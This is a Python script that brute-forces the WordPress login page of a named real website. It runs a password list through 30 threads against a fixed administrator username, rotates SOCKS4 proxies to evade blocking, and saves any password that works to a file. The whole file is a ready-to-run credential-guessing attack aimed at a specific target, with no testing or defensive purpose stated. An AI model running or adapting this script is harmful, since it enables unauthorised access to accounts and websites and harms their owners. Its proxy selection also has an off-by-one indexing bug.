#!/usr/bin/env python
from multiprocessing.pool import ThreadPool
from time import time as timer
import requests
import random

"""
    just modify next variables:
        -incorrect_password_phrase
        -login_url
        -socksFile
        -passwordsFile
        -payload params if needed  ( Line: 48  -  Variable: pload )
"""

passwordsFile="passes.txt"
socksFile="socks4.txt"
correct_password_phrase=""
incorrect_password_phrase="ce mot de passe ne correspond pas"
login_url="https://www.saturn.lu/wp-login.php";

headers={
'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0', 
'Cookie':'wordpress_test_cookie=WP Cookie check',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
}

proxy_file = open(socksFile, "r")
proxies = proxy_file.readlines()
proxy_file.close()
passwd_file = open(passwordsFile, "r")
passwords = passwd_file.readlines()
passwd_file.close()

urls = []
for x in range(0,len(passwords)):
  x=int(x)
  urls.append([passwords[x]])

def fetch_url(url):
    a=0
    while (a==0):
        p = proxies[random.randint(1,len(proxies))]
        proxi ="socks4://"+p.replace("\n", "")
        proxy = {'https':  proxi}
        passwd = url[0].replace("\n", "")
        try:
            pload = {'log':'itradmin','pwd':passwd,'wp-submit':'Se+connecter','testcookie':'1' }
            response = requests.post(login_url,data = pload,proxies=proxy,headers=headers,timeout=5)
            code = response.status_code
            if(code != 0 & code != 403):
                resp=response.content;
                a=1;
                return login_url, resp,proxi, code,None,url[0]
        except Exception as e:
            bt=0;

results = ThreadPool(30).imap_unordered(fetch_url, urls)
for url, html, proxyresp ,code,error,passwd in results:
    if error is None and code != 403:
        x = html.find("Access Denied")
        if(x == -1):
            x2 = html.find(incorrect_password_phrase)
            if(x2 == -1):
                print(passwd + " => Is The Correct Password!")
                file1 = open("found.txt", "a")
                file1.write( passwd.replace("\n", "") + "=>"+ str(code) + "\n" + html + " ====================== \n\n\n" )
                file1.close()
            else:
                print(str(passwd.replace("\n", ""))+"=>incorrect")
    else:
        bt2=0;
        #file1 = open("errors.txt", "a")
        #file1.write( passwd.replace("\n", "") + "=>"+ str(code) + "\n" )
        #file1.close()
        #print("error fetching %r: %s" % (url + "=>", proxyresp))
